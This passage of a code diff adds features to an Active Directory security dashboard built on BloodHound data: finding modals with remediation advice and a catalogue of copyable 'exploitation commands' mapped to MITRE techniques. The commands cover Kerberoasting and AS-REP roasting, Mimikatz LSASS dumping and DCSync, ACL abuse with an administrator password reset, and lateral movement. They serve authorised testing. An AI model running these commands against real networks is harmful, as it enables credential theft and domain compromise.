+                    <div style="background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.2); border-radius:8px; padding:12px 16px;">
+                        <div style="display:flex; align-items:center; gap:8px; color:var(--color-high); font-weight:600; font-size:13px; margin-bottom:6px;">
+                            <i class="fa-solid fa-triangle-exclamation"></i>
+                            <span>${catIssues.length} Vulnerability/Misconfig Alert(s)</span>
+                        </div>
+                        <p style="font-size:12px; color:var(--text-secondary); margin:0 0 10px 0; line-height:1.4;">
+                            Severe security exposures have been detected that impact this role's posture.
+                        </p>
+                        <button class="btn btn-primary btn-sm" onclick="event.stopPropagation(); window.showMappingAlertsModal('${categoryName}', '${categoryKey}')" style="width:100%; background:var(--color-high); border:none; display:flex; justify-content:center; align-items:center; gap:6px;">
+                            <i class="fa-solid fa-eye"></i> View Remediation Details
+                        </button>
+                    </div>
+                `;
+            } else {
+                alertsHeaderHtml = `
+                    <div style="background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.2); border-radius:8px; padding:12px 16px; display:flex; align-items:center; gap:10px;">
+                        <i class="fa-solid fa-circle-check" style="color:var(--accent-green); font-size:18px;"></i>
+                        <div style="font-size:12px;">
+                            <div style="color:#fff; font-weight:600;">Status: Secure</div>
+                            <span style="color:var(--text-secondary);">No issues found for this infrastructure role.</span>
+                        </div>
+                    </div>
+                `;
+            }
+
+            content.innerHTML = `
+                <div style="display:flex; align-items:center; gap:12px; margin-bottom:12px;">
+                    <div style="width:40px; height:40px; border-radius:10px; background:rgba(99,102,241,0.15); border:1px solid rgba(99,102,241,0.3); display:flex; align-items:center; justify-content:center; color:var(--accent-indigo); font-size:18px;">
+                        <i class="fa-solid ${icon}"></i>
+                    </div>
+                    <div>
+                        <h3 style="margin:0; font-size:18px; font-weight:700; color:#fff;">${categoryName}</h3>
+                        <span style="font-size:12px; color:var(--text-muted);">Scope: <strong>${analogy}</strong></span>
+                    </div>
+                </div>
+
+                ${alertsHeaderHtml}
+
+                <div style="margin-top:16px;">
+                    <h5 style="margin:0 0 10px 0; font-size:12px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted);">Detected Servers</h5>
+                    ${serversHtml}
+                </div>
+            `;
+
+            backdrop.classList.add('active');
+            drawer.classList.add('active');
+        };
+
+        window.closeServerDrawer = function() {
+            const backdrop = document.getElementById('ad-server-drawer-backdrop');
+            const drawer = document.getElementById('ad-server-drawer');
+            if (backdrop) backdrop.classList.remove('active');
+            if (drawer) drawer.classList.remove('active');
+            document.querySelectorAll('.topology-node').forEach(node => {
+                node.classList.remove('active-selected');
+            });
+        };
+
+        window.closeServerDrawer = function() {
+            const backdrop = document.getElementById('ad-server-drawer-backdrop');
+            const drawer = document.getElementById('ad-server-drawer');
+            if (backdrop) backdrop.classList.remove('active');
+            if (drawer) drawer.classList.remove('active');
+            document.querySelectorAll('.topology-node').forEach(node => {
+                node.classList.remove('active-selected');
+            });
+        };
+
+        const applyADMappingFilters = () => {
+            const query = (document.getElementById('ad-mapping-search')?.value || '').toLowerCase().trim();
+            const roleFilter = document.getElementById('ad-mapping-role-filter')?.value || '';
+            const rows = mappingTbody.querySelectorAll('tr[data-role]');
+
+            rows.forEach(row => {
+                const role = row.getAttribute('data-role');
+                const servers = row.querySelectorAll('.detected-server-item');
+                
+                const roleMatches = !roleFilter || role === roleFilter;
+                
+                let matchCount = 0;
+                servers.forEach(srv => {
+                    const text = srv.textContent.toLowerCase();
+                    const srvMatches = !query || text.includes(query);
+                    if (srvMatches) {
+                        srv.style.display = 'flex';
+                        matchCount++;
+                    } else {
+                        srv.style.display = 'none';
+                    }
+                });
+
+                if (roleMatches && (servers.length === 0 || matchCount > 0 || !query)) {
+                    row.style.display = '';
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+        };
+
+        const searchEl = document.getElementById('ad-mapping-search');
+        const roleEl = document.getElementById('ad-mapping-role-filter');
+        if (searchEl) {
+            searchEl.removeEventListener('input', applyADMappingFilters);
+            searchEl.addEventListener('input', applyADMappingFilters);
+        }
+        if (roleEl) {
+            roleEl.removeEventListener('change', applyADMappingFilters);
+            roleEl.addEventListener('change', applyADMappingFilters);
+        }
+    }
+    // ── AD Highlight Details Modal ──────────────────────────────────────────
+    window.showADHighlightDetails = function(type) {
+        const modal = document.getElementById('details-modal');
+        const modalTitle = document.getElementById('modal-title');
+        const modalContent = document.getElementById('modal-content');
+        if (!modal || !modalTitle || !modalContent) return;
+
+        const issues = (analysisResult && analysisResult.issues) || [];
+
+        const configs = {
+            'asrep': {
+                label: 'AS-REP Roastable Accounts',
+                icon: 'fa-fire',
+                color: '#ef4444',
+                bgColor: 'rgba(239,68,68,0.08)',
+                borderColor: 'rgba(239,68,68,0.2)',
+                filter: i => i.title && (i.title.includes('AS-REP') || i.title.includes('Pre-Authentication') || i.title.includes('ASREP')),
+                description: 'Accounts with Kerberos pre-authentication disabled. Attackers can request an encrypted TGT without credentials and crack it offline.',
+                remedy: 'Enable Kerberos Pre-Authentication for all standard user accounts.'
+            },
+            'kerb': {
+                label: 'Kerberoastable Accounts',
+                icon: 'fa-key',
+                color: '#f59e0b',
+                bgColor: 'rgba(245,158,11,0.08)',
+                borderColor: 'rgba(245,158,11,0.2)',
+                filter: i => i.title && i.title.includes('Kerberoastable'),
+                description: 'Service accounts with SPNs set. Attackers can request a service ticket and crack the password hash offline.',
+                remedy: 'Use strong (>25 char) randomised passwords for service accounts. Consider using Managed Service Accounts (gMSA).'
+            },
+            'never-exp': {
+                label: 'Password Never Expires',
+                icon: 'fa-clock',
+                color: '#7c3aed',
+                bgColor: 'rgba(124,58,237,0.08)',
+                borderColor: 'rgba(124,58,237,0.2)',
+                filter: i => i.title && i.title.includes('Password Never Expires'),
+                description: 'Accounts whose passwords never expire increase the risk of credential compromise over time.',
+                remedy: 'Enforce a password expiration policy and rotate all affected accounts immediately.'
+            },
+            'uncon': {
+                label: 'Unconstrained Delegation',
+                icon: 'fa-arrow-right-from-bracket',
+                color: '#10b981',
+                bgColor: 'rgba(16,185,129,0.08)',
+                borderColor: 'rgba(16,185,129,0.2)',
+                filter: i => i.title && i.title.includes('Unconstrained'),
+                description: 'Computers/accounts configured with unconstrained delegation allow the impersonation of any user that authenticates to them.',
+                remedy: 'Replace unconstrained delegation with constrained delegation or resource-based constrained delegation (RBCD).'
+            }
+        };
+
+        const cfg = configs[type];
+        if (!cfg) return;
+
+        const matched = issues.filter(cfg.filter);
+
+        // Also extract accounts from raw_data as fallback
+        const rawData = (analysisResult && analysisResult.tree && analysisResult.tree.raw_data) || {};
+        const rawUsers = rawData.users || [];
+        let extraRows = '';
+
+        if (matched.length === 0) {
+            // Try to derive from raw users based on properties
+            let derivedAccounts = [];
+            if (type === 'asrep') {
+                derivedAccounts = rawUsers.filter(u => u.Properties && u.Properties.dontreqpreauth === true);
+            } else if (type === 'kerb') {
+                derivedAccounts = rawUsers.filter(u => u.Properties && u.Properties.hasspn === true);
+            } else if (type === 'never-exp') {
+                derivedAccounts = rawUsers.filter(u => u.Properties && u.Properties.pwdneverexpires === true);
+            } else if (type === 'uncon') {
+                const rawComps = rawData.computers || [];
+                derivedAccounts = rawComps.filter(c => c.Properties && c.Properties.unconstraineddelegation === true);
+            }
+
+            if (derivedAccounts.length > 0) {
+                extraRows = derivedAccounts.map((acc, i) => {
+                    const name = acc.Properties?.name || acc.Properties?.samaccountname || `Account-${i+1}`;
+                    const enabled = acc.Properties?.enabled !== false ? 'Enabled' : 'Disabled';
+                    return `
+                        <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+                            <td style="padding:10px 12px; color:var(--text-muted); font-size:12px;">${i + 1}</td>
+                            <td style="padding:10px 12px; font-family:monospace; font-size:12px; color:#fff;">${name}</td>
+                            <td style="padding:10px 12px;">
+                                <span style="font-size:10px; font-weight:700; padding:2px 7px; border-radius:4px; background:rgba(239,68,68,0.15); color:#ef4444; border:1px solid rgba(239,68,68,0.3);">CRITICAL</span>
+                            </td>
+                            <td style="padding:10px 12px; font-size:12px; color:var(--text-secondary);">${enabled}</td>
+                            <td style="padding:10px 12px; font-size:12px; color:var(--text-secondary);">Detected via raw BloodHound data</td>
+                        </tr>
+                    `;
+                }).join('');
+            }
+        }
+
+        const issueRows = matched.map((iss, i) => {
+            const sevColor = iss.severity === 'Critical' ? '#ef4444' : iss.severity === 'High' ? '#f97316' : iss.severity === 'Medium' ? '#f59e0b' : '#10b981';
+            const accountName = iss.affected_object || iss.title || `Issue-${i+1}`;
+            return `
+                <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+                    <td style="padding:10px 12px; color:var(--text-muted); font-size:12px;">${i + 1}</td>
+                    <td style="padding:10px 12px; font-family:monospace; font-size:12px; color:#fff;">${accountName}</td>
+                    <td style="padding:10px 12px;">
+                        <span style="font-size:10px; font-weight:700; padding:2px 7px; border-radius:4px; background:${sevColor}20; color:${sevColor}; border:1px solid ${sevColor}40;">${iss.severity || 'N/A'}</span>
+                    </td>
+                    <td style="padding:10px 12px; font-size:12px; color:var(--text-secondary);">${iss.cvss_score ? iss.cvss_score.toFixed(1) : '—'}</td>
+                    <td style="padding:10px 12px; font-size:12px; color:var(--text-secondary);">${iss.description ? iss.description.slice(0, 80) + (iss.description.length > 80 ? '…' : '') : '—'}</td>
+                </tr>
+            `;
+        }).join('');
+
+        const allRows = issueRows || extraRows;
+        const totalCount = matched.length || (extraRows ? extraRows.split('<tr ').length - 1 : 0);
+
+        modalTitle.innerHTML = `<i class="fa-solid ${cfg.icon}" style="color:${cfg.color}; margin-right:8px;"></i>${cfg.label}`;
+
+        modalContent.innerHTML = `
+            <div style="background:${cfg.bgColor}; border:1px solid ${cfg.borderColor}; border-radius:10px; padding:14px 16px; margin-bottom:16px;">
+                <p style="margin:0 0 6px 0; font-size:13px; font-weight:600; color:${cfg.color};">What is this?</p>
+                <p style="margin:0 0 8px 0; font-size:12px; color:var(--text-secondary); line-height:1.5;">${cfg.description}</p>
+                <p style="margin:0; font-size:12px; font-weight:600; color:var(--text-primary);"><i class="fa-solid fa-shield-halved" style="margin-right:6px; color:${cfg.color};"></i>Recommended Fix: <span style="font-weight:400; color:var(--text-secondary);">${cfg.remedy}</span></p>
+            </div>
+            <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:10px;">
+                <h5 style="margin:0; font-size:12px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted);">Affected Accounts / Issues</h5>
+                <span style="font-size:11px; font-weight:700; padding:3px 10px; border-radius:6px; background:${cfg.color}20; color:${cfg.color}; border:1px solid ${cfg.color}40;">${totalCount} Found</span>
+            </div>
+            ${allRows ? `
+            <div style="overflow-x:auto; border-radius:8px; border:1px solid rgba(255,255,255,0.06);">
+                <table style="width:100%; border-collapse:collapse; font-size:12px;">
+                    <thead>
+                        <tr style="background:rgba(255,255,255,0.03);">
+                            <th style="padding:10px 12px; text-align:left; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); font-weight:600;">#</th>
+                            <th style="padding:10px 12px; text-align:left; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); font-weight:600;">Account / Object</th>
+                            <th style="padding:10px 12px; text-align:left; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); font-weight:600;">Severity</th>
+                            <th style="padding:10px 12px; text-align:left; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); font-weight:600;">CVSS</th>
+                            <th style="padding:10px 12px; text-align:left; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); font-weight:600;">Details</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${allRows}
+                    </tbody>
+                </table>
+            </div>` : `
+            <div style="background:rgba(16,185,129,0.08); border:1px solid rgba(16,185,129,0.2); border-radius:8px; padding:16px; text-align:center;">
+                <i class="fa-solid fa-circle-check" style="color:var(--accent-green); font-size:24px; margin-bottom:8px; display:block;"></i>
+                <div style="color:#fff; font-weight:600; margin-bottom:4px;">No Issues Found</div>
+                <div style="font-size:12px; color:var(--text-secondary);">No accounts with this vulnerability were detected in the BloodHound dataset.</div>
+            </div>`}
+        `;
+
+        detailsModal.style.display = 'flex';
+    };
+
+    // ── Attack Path Detail Modal (from List View "Exploit Steps" button) ────
+    window.showAttackPathDetail = function(vType) {
+        const commandData = {
+            'all_kerberoastable':                  { tool: 'Impacket (GetUserSPNs) & Rubeus',        mitre: 'T1558.003', technique: 'Kerberoasting (All SPNs)',            severity: 'High',     desc: 'Requesting Kerberos Service Tickets (TGS-REP) for offline password cracking (Kerberoasting).', commands: [{ label: 'Impacket GetUserSPNs (Request Tickets)', cmd: 'GetUserSPNs.py -request -dc-ip 10.10.10.10 DOMAIN/user:pass' }, { label: 'Rubeus (Request & Dump Tickets)', cmd: 'Rubeus.exe kerberoast /outfile:hashes.txt' }, { label: 'Hashcat (Offline Cracking)', cmd: 'hashcat -m 13100 hashes.txt passwords.txt' }] },
+            'shortest_path_to_da_from_kerberoastable': { tool: 'Impacket + Hashcat',                mitre: 'T1558.003', technique: 'Kerberoast → DA Escalation',          severity: 'Critical', desc: 'Abusing Kerberoastable high-privilege users to obtain tickets and escalate rights.', commands: [{ label: 'GetUserSPNs (Request Tickets)', cmd: 'GetUserSPNs.py -request -dc-ip 10.10.10.10 DOMAIN/user:pass' }, { label: 'Hashcat (Offline Cracking)', cmd: 'hashcat -m 13100 hashes.txt passwords.txt' }] },
+            'shortest_path_kerberoastable':        { tool: 'Impacket GetUserSPNs',                   mitre: 'T1558.003', technique: 'Kerberoasting (Targeted)',             severity: 'High',     desc: 'Requesting service tickets for targeted Kerberoastable accounts.', commands: [{ label: 'Impacket GetUserSPNs', cmd: 'GetUserSPNs.py -request -dc-ip 10.10.10.10 DOMAIN/user:pass' }] },
+            'asrep_roastable':                     { tool: 'Impacket (GetNPUsers) & Rubeus',         mitre: 'T1558.004', technique: 'AS-REP Roasting',                      severity: 'Critical', desc: 'Harvesting AS-REP hashes for users that do not require Kerberos pre-authentication.', commands: [{ label: 'Impacket GetNPUsers (Request Hashes)', cmd: 'GetNPUsers.py -request -no-pass -dc-ip 10.10.10.10 DOMAIN/ -usersfile users.txt' }, { label: 'Rubeus (Harvest & Dump Hashes)', cmd: 'Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt' }, { label: 'Hashcat (Offline Cracking)', cmd: 'hashcat -m 18200 hashes.txt passwords.txt' }] },
+            'unconstrained_delegation':            { tool: 'Rubeus & Printer Bug Coercion',          mitre: 'T1558.001', technique: 'Unconstrained Delegation Abuse',      severity: 'Critical', desc: 'Tricking a high-privilege account/DC to authenticate to a server with Unconstrained Delegation to dump tickets.', commands: [{ label: 'Rubeus (Monitor & Capture Tickets)', cmd: 'Rubeus.exe monitor /interval:5' }, { label: 'SpoolerTrigger (Coerce DC Auth)', cmd: 'MS-RPRN.py 10.10.10.10 10.10.10.12 -u user -p pass' }, { label: 'Rubeus (Inject Captured Ticket)', cmd: 'Rubeus.exe ptt /ticket:ticket.kirbi' }] },
+            'shortest_path':                       { tool: 'BloodHound, Mimikatz & Secretsdump',    mitre: 'T1078.002', technique: 'Shortest Path to Domain Admin',        severity: 'Critical', desc: 'Finding shortest path to Domain Admin, executing credential dumping to escalate privileges.', commands: [{ label: 'Secretsdump (Extract Hashes)', cmd: 'secretsdump.py DOMAIN/user:pass@10.10.10.10' }, { label: 'Mimikatz (Dump LSASS Secrets)', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' }] },
+            'shortest_path_to_hvt':                { tool: 'BloodHound & Mimikatz',                 mitre: 'T1078',     technique: 'Path to High-Value Target',            severity: 'Critical', desc: 'Finding shortest path to High Value Targets inside the Active Directory database.', commands: [{ label: 'Mimikatz (Extract Hashes)', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' }] },
+            'shortest_path_to_da_from_owned':      { tool: 'Impacket psexec / NetExec',             mitre: 'T1078.002', technique: 'Privilege Escalation to DA',            severity: 'Critical', desc: 'Abusing compromised accounts to perform administrative pivots to Domain Admins.', commands: [{ label: 'PsExec (Establish Shell)', cmd: 'psexec.py DOMAIN/user:pass@10.10.10.10' }] },
+            'shortest_path_from_owned':            { tool: 'Impacket Suite',                        mitre: 'T1021',     technique: 'Lateral Movement from Owned',           severity: 'Critical', desc: 'Determining exploitation avenues beginning from active compromised identities.', commands: [{ label: 'NetExec SMB Lateral Pivot', cmd: 'nxc smb 10.10.10.0/24 -u user -p pass --local-auth' }] },
+            'most_admins':                         { tool: 'NetExec / CrackMapExec',                mitre: 'T1078.003', technique: 'Local Admin Privilege Abuse',           severity: 'High',     desc: 'Leveraging local administrator privileges across target hosts for lateral movement.', commands: [{ label: 'NetExec (Validate Local Admin)', cmd: 'nxc smb 10.10.10.0/24 -u user -p pass --local-auth' }, { label: 'NetExec (WMI Command Exec)', cmd: 'nxc smb 10.10.10.15 -u user -p pass -x "whoami"' }] },
+            'da_logons_non_dc':                    { tool: 'Mimikatz & LSASS Dump',                 mitre: 'T1003.001', technique: 'Credential Theft from Workstation',    severity: 'Critical', desc: 'Dumping credentials of active Domain Admin sessions on workstations.', commands: [{ label: 'LSASS Dump via Procdump', cmd: 'procdump.exe -ma lsass.exe lsass.dmp' }, { label: 'Mimikatz (Extract from Dump)', cmd: 'mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit' }] },
+            'dangerous_domain_users':              { tool: 'PowerView (PowerSploit)',               mitre: 'T1222.001', technique: 'ACL Abuse / WriteDACL',                 severity: 'Critical', desc: 'Abusing dangerous write permissions or ACL configuration grants on sensitive AD objects.', commands: [{ label: 'PowerView (Add to Sensitive Group)', cmd: 'Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "Domain Users" -Rights GenericAll' }, { label: 'PowerView (Force Password Change)', cmd: 'Set-DomainUserPassword -Identity administrator -NewPassword "P@ssw0rd123!"' }] },
+            'all_domain_admins':                   { tool: 'PowerView / Net User',                  mitre: 'T1069.002', technique: 'Domain Admin Enumeration',              severity: 'High',     desc: 'Querying and listing all privileged group memberships within Domain Admins.', commands: [{ label: 'Get Domain Admin Members (CMD)', cmd: 'net group "Domain Admins" /domain' }, { label: 'Get DA Members (PowerShell)', cmd: 'Get-ADGroupMember -Identity "Domain Admins"' }] },
+            'dcsync_rights':                       { tool: 'Mimikatz (dcsync)',                     mitre: 'T1003.006', technique: 'DCSync (AD Replication Abuse)',         severity: 'Critical', desc: 'Performing Domain Replication requests to dump Active Directory password hashes.', commands: [{ label: 'DCSync Krbtgt Hash', cmd: 'mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:krbtgt" exit' }, { label: 'DCSync All Users', cmd: 'mimikatz.exe "lsadump::dcsync /domain:DOMAIN /all" exit' }] },
+            'domain_trusts':                       { tool: 'PowerView / nltest',                    mitre: 'T1484.002', technique: 'Domain Trust Exploitation',             severity: 'High',     desc: 'Discovering external trust connections and trust direction schemas across domains.', commands: [{ label: 'Get Domain Trusts (nltest)', cmd: 'nltest /domain_trusts' }, { label: 'Get Trusts (PowerShell)', cmd: 'Get-ADTrust -Filter *' }] },
+            'foreign_users':                       { tool: 'PowerView',                             mitre: 'T1484',     technique: 'Foreign User Exploitation',             severity: 'Medium',   desc: 'Finding nested users originating from trusted external forest directories.', commands: [{ label: 'Get Foreign Users', cmd: 'Get-DomainUser -Foreign' }] },
+            'foreign_groups':                      { tool: 'PowerView',                             mitre: 'T1484',     technique: 'Foreign Group Membership Abuse',        severity: 'Medium',   desc: 'Finding nested security groups originating from trusted external forest directories.', commands: [{ label: 'Get Foreign Groups', cmd: 'Get-DomainGroup -Foreign' }] },
+            'domain_users_local_admin':            { tool: 'NetExec / PowerView',                   mitre: 'T1078.003', technique: 'Domain Users → Local Admin',            severity: 'High',     desc: 'Finding local administrator permissions assigned directly to Domain Users group.', commands: [{ label: 'Scan Local Admin Rights', cmd: 'nxc smb 10.10.10.0/24 -u user -p pass' }] },
+            'domain_users_read_laps':              { tool: 'LAPS Toolkit / PowerView',              mitre: 'T1552',     technique: 'LAPS Password Read',                    severity: 'High',     desc: 'Querying ACEs allowing domain accounts to read computer local admin password attributes.', commands: [{ label: 'Read LAPS Attribute', cmd: 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "ReadProperty" }' }] },
+            'workstations_rdp':                    { tool: 'NetExec / xfreerdp',                    mitre: 'T1021.001', technique: 'RDP Lateral Movement (Workstation)',    severity: 'Medium',   desc: 'Scanning and listing workstations accessible via Remote Desktop Protocol (RDP).', commands: [{ label: 'NetExec RDP Scan', cmd: 'nxc rdp 10.10.10.0/24' }] },
+            'servers_rdp':                         { tool: 'NetExec',                               mitre: 'T1021.001', technique: 'RDP Lateral Movement (Server)',         severity: 'High',     desc: 'Scanning and listing server resources accessible via Remote Desktop Protocol (RDP).', commands: [{ label: 'NetExec RDP Scan', cmd: 'nxc rdp 10.10.10.0/24' }] },
+            'unsupported_os':                      { tool: 'Nmap OS Detection + Metasploit',        mitre: 'T1190',     technique: 'Legacy OS Exploitation',               severity: 'High',     desc: 'Scanning networks to locate computer targets executing end-of-life operating systems.', commands: [{ label: 'Nmap OS Detection', cmd: 'nmap -O 10.10.10.0/24' }] },
+            'kerberoastable_hvt_members':          { tool: 'Rubeus / Hashcat',                      mitre: 'T1558.003', technique: 'Kerberoastable HVT Member Abuse',      severity: 'Critical', desc: 'Targeting high-value group members with active SPNs for Kerberoasting.', commands: [{ label: 'Rubeus Kerberoast HVT', cmd: 'Rubeus.exe kerberoast /spn:SPN_VALUE /outfile:hash.txt' }, { label: 'Hashcat Crack TGS-REP', cmd: 'hashcat -m 13100 hash.txt wordlist.txt' }] },
+            'kerberoastable_most_privileges':      { tool: 'Rubeus kerberoast',                     mitre: 'T1558.003', technique: 'High-Privilege Kerberoasting',          severity: 'Critical', desc: 'Kerberoasting the most privileged service accounts first for maximum impact.', commands: [{ label: 'Rubeus Targeted Kerberoast', cmd: 'Rubeus.exe kerberoast /user:SVC_ADMIN /outfile:hash.txt' }] },
+            'shortest_path_users_to_hvt':          { tool: 'BloodHound / Secretsdump',             mitre: 'T1078',     technique: 'Users → HVT Path',                      severity: 'High',     desc: 'Mapping delegation and privilege paths from typical Domain Users to High Value Targets.', commands: [{ label: 'Secretsdump (Local Secrets)', cmd: 'secretsdump.py DOMAIN/user:pass@10.10.10.10' }] },
+            'all_paths_users_to_hvt':              { tool: 'BloodHound Grapher',                    mitre: 'T1078',     technique: 'All Users → HVT Paths',                severity: 'High',     desc: 'Mapping all security group delegation linkages connecting Domain Users to HVT nodes.', commands: [{ label: 'SharpHound Collection', cmd: 'SharpHound.exe -c All' }] }
+        };
+
+        const data = commandData[vType];
+        if (!data) return;
+        const sevColor = data.severity === 'Critical' ? '#ef4444' : data.severity === 'High' ? '#f97316' : data.severity === 'Medium' ? '#f59e0b' : '#3b82f6';
+
+        const commandRows = data.commands.map((c, i) => `
+            <div style="background:rgba(0,0,0,0.3); border:1px solid rgba(255,255,255,0.06); border-radius:8px; padding:12px 14px; margin-bottom:8px;">
+                <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:6px;">
+                    <span style="font-size:11px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.4px;">Step ${i+1} — ${c.label}</span>
+                    <button onclick="navigator.clipboard.writeText('${c.cmd.replace(/'/g, "\\'")}').then(()=>{ this.textContent='✓ Copied'; setTimeout(()=>{ this.innerHTML='<i class=\\'fa-solid fa-copy\\'></i> Copy'; },1500); })" style="font-size:9px; padding:2px 8px; border-radius:4px; background:rgba(99,102,241,0.12); color:#818cf8; border:1px solid rgba(99,102,241,0.25); cursor:pointer; font-weight:600; display:inline-flex; align-items:center; gap:4px;">
+                        <i class="fa-solid fa-copy"></i> Copy
+                    </button>
+                </div>
+                <code style="display:block; font-family:monospace; font-size:11px; color:#a5b4fc; word-break:break-all; line-height:1.5; background:rgba(0,0,0,0.4); padding:8px 10px; border-radius:5px;">${c.cmd}</code>
+            </div>
+        `).join('');
+
+        modalTitle.innerHTML = `<i class="fa-solid fa-route" style="color:${sevColor}; margin-right:8px;"></i>${data.technique}`;
+        modalContent.innerHTML = `
+            <div style="display:flex; align-items:center; gap:8px; margin-bottom:14px; flex-wrap:wrap;">
+                <span style="font-size:10px; font-weight:700; padding:3px 9px; border-radius:5px; background:${sevColor}18; color:${sevColor}; border:1px solid ${sevColor}40;">${data.severity.toUpperCase()}</span>
+                <span style="font-size:10px; padding:3px 9px; border-radius:5px; background:rgba(99,102,241,0.12); color:#818cf8; border:1px solid rgba(99,102,241,0.25); font-family:monospace; font-weight:700;">MITRE ${data.mitre}</span>
+                <span style="font-size:10px; color:var(--text-muted); display:flex; align-items:center; gap:5px;"><i class="fa-solid fa-terminal" style="font-size:9px;"></i> ${data.tool}</span>
+            </div>
+            <p style="font-size:12px; color:var(--text-secondary); margin:0 0 14px 0; line-height:1.55; background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.05); border-radius:6px; padding:10px 12px;">${data.desc}</p>
+            <h5 style="margin:0 0 10px 0; font-size:11px; text-transform:uppercase; letter-spacing:0.5px; color:var(--text-muted); display:flex; align-items:center; gap:6px;">
+                <i class="fa-solid fa-list-check" style="color:${sevColor};"></i> Exploitation Commands
+            </h5>
+            ${commandRows}
+            <div style="margin-top:10px; background:rgba(245,158,11,0.06); border:1px solid rgba(245,158,11,0.15); border-radius:6px; padding:10px 12px; font-size:11px; color:var(--text-secondary); display:flex; gap:8px; align-items:flex-start;">
+                <i class="fa-solid fa-triangle-exclamation" style="color:#f59e0b; margin-top:1px; flex-shrink:0;"></i>
+                <span>These commands are for <strong style="color:var(--text-primary);">authorized penetration testing</strong> and security research only. Replace placeholders (IP, domain, credentials) with your actual target values.</span>
+            </div>
+        `;
+        detailsModal.style.display = 'flex';
+    };
 
     function renderDistribution(stats) {
         const container = document.getElementById('dist-bars-container');
@@ -5698,6 +7059,56 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         });
 
+        // Setup toggle buttons for Graph View / List View
+        const toggleGraphBtn = document.getElementById('bh-toggle-graph');
+        const toggleListBtn = document.getElementById('bh-toggle-list');
+        const canvasContainer = document.getElementById('ad-graph-canvas');
+        const listViewContainer = document.getElementById('ad-graph-list-view');
+
+        const updateToggleUI = (activeView) => {
+            if (activeView === 'graph') {
+                if (toggleGraphBtn) {
+                    toggleGraphBtn.style.background = 'var(--accent-indigo)';
+                    toggleGraphBtn.style.color = '#fff';
+                }
+                if (toggleListBtn) {
+                    toggleListBtn.style.background = 'none';
+                    toggleListBtn.style.color = 'var(--text-muted)';
+                }
+                if (canvasContainer) canvasContainer.style.display = 'block';
+                if (listViewContainer) listViewContainer.style.display = 'none';
+            } else {
+                if (toggleListBtn) {
+                    toggleListBtn.style.background = 'var(--accent-indigo)';
+                    toggleListBtn.style.color = '#fff';
+                }
+                if (toggleGraphBtn) {
+                    toggleGraphBtn.style.background = 'none';
+                    toggleGraphBtn.style.color = 'var(--text-muted)';
+                }
+                if (canvasContainer) canvasContainer.style.display = 'none';
+                if (listViewContainer) listViewContainer.style.display = 'block';
+            }
+        };
+
+        if (toggleGraphBtn && toggleListBtn && canvasContainer && listViewContainer) {
+            if (!toggleGraphBtn.dataset.bound) {
+                toggleGraphBtn.dataset.bound = "true";
+                toggleGraphBtn.addEventListener('click', () => {
+                    updateToggleUI('graph');
+                });
+            }
+            if (!toggleListBtn.dataset.bound) {
+                toggleListBtn.dataset.bound = "true";
+                toggleListBtn.addEventListener('click', () => {
+                    updateToggleUI('list');
+                });
+            }
+            // Default view state is graph
+            updateToggleUI('graph');
+        }
+
+
         // Setup query list click events and styling
         const CYPHER_QUERIES = {
             'all_domain_admins': 'MATCH (u:User)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS"}) RETURN u.name',
@@ -5901,10 +7312,225 @@ document.addEventListener('DOMContentLoaded', () => {
             drawNetwork(queryVal);
         }
     }
+    function updateAttackCommandsUI(viewType) {
+        const bar = document.getElementById('bh-attack-commands-bar');
+        const content = document.getElementById('bh-attack-commands-content');
+        if (!bar || !content) return;
 
+        const commandData = {
+            'all_kerberoastable': {
+                tool: 'Impacket (GetUserSPNs) & Rubeus',
+                desc: 'Requesting Kerberos Service Tickets (TGS-REP) for offline password cracking (Kerberoasting).',
+                commands: [
+                    { label: 'Impacket GetUserSPNs (Request Tickets)', cmd: 'GetUserSPNs.py -request -dc-ip 10.10.10.10 MANTAINSIGHT.LOCAL/username:password' },
+                    { label: 'Rubeus (Request & Dump Tickets)', cmd: 'Rubeus.exe kerberoast /outfile:hashes.txt' },
+                    { label: 'Hashcat (Offline Cracking)', cmd: 'hashcat -m 13100 hashes.txt passwords.txt' }
+                ]
+            },
+            'shortest_path_to_da_from_kerberoastable': {
+                tool: 'Impacket (GetUserSPNs) & Hashcat',
+                desc: 'Abusing Kerberoastable high privilege users to obtain tickets and escalate rights.',
+                commands: [
+                    { label: 'Impacket GetUserSPNs (Request Tickets)', cmd: 'GetUserSPNs.py -request -dc-ip 10.10.10.10 MANTAINSIGHT.LOCAL/username:password' },
+                    { label: 'Hashcat (Offline Cracking)', cmd: 'hashcat -m 13100 hashes.txt passwords.txt' }
+                ]
+            },
+            'shortest_path_kerberoastable': {
+                tool: 'Impacket (GetUserSPNs) & Hashcat',
+                desc: 'Requesting service tickets for targeted kerberoastable accounts.',
+                commands: [
+                    { label: 'Impacket GetUserSPNs (Request Tickets)', cmd: 'GetUserSPNs.py -request -dc-ip 10.10.10.10 MANTAINSIGHT.LOCAL/username:password' }
+                ]
+            },
+            'asrep_roastable': {
